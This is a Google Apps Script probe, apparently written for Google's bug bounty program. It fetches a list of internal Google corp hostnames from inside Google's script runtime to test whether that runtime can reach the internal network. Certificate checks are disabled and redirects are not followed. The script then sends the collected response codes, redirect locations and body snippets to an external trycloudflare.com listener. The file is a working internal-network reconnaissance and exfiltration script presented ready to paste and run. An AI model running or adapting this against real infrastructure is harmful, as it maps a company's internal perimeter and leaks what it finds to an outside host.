// GVRP CORE probe — Alphabet corp perimeter, run from Google's own script runtime.
// Paste into script.google.com (new project), run probe(), authorize when prompted.
// Results appear in the execution log AND at our research listener.
function probe() {
  var LISTENER = 'https://professor-quoted-raid-owned.trycloudflare.com';
  var targets = [
    // internal-only DNS outside Google (NXDOMAIN baseline) — the kill-shot pair
    'https://momma.corp.google.com/',            // internal monorepo search
    'https://rbe-prod.c3.macservice.goog/',      // internal Mac CI fleet (VRP-disclosed)
    // corp hosts that DO answer outside — compare status/body/Location from inside
    'https://source.corp.google.com/',           // google3 source browser (leaked via cs.corp redirect)
    'https://goto2.corp.google.com/',            // internal shortlink tier 2 (leaked via goto redirect)
    'https://goto.google.com/',                  // shortlink tier 1
    'https://cs.corp.google.com/',               // internal codesearch
    'https://corp.google.com/',                  // corp apex (no TLS outside)
    'https://login.corp.google.com/',            // corp SSO login (200 outside — body diff test)
    // controls
    'https://www.google.com/',
    'https://definitely-not-real-0xdeadbeef.invalid/'
  ];
  var out = [];
  targets.forEach(function(u) {
    try {
      var r = UrlFetchApp.fetch(u, {muteHttpExceptions: true, followRedirects: false, validateHttpsCertificates: false});
      var loc = r.getHeaders()['Location'] || '';
      var body = String(r.getContentText()).replace(/\s+/g, ' ').slice(0, 120);
      out.push(u + ' => HTTP ' + r.getResponseCode() + (loc ? ' | Location: ' + loc.slice(0, 160) : '') + ' | ' + body);
    } catch (e) {
      out.push(u + ' => FETCH-FAIL: ' + String(e.message).slice(0, 140));
    }
  });
  var report = out.join('\n');
  Logger.log(report);
  try {
    UrlFetchApp.fetch(LISTENER + '/appsscript-core-results-gvrp?d=' + encodeURIComponent(report.slice(0, 1500)));
  } catch (e2) {
    Logger.log('listener beacon failed: ' + e2.message);
  }
}
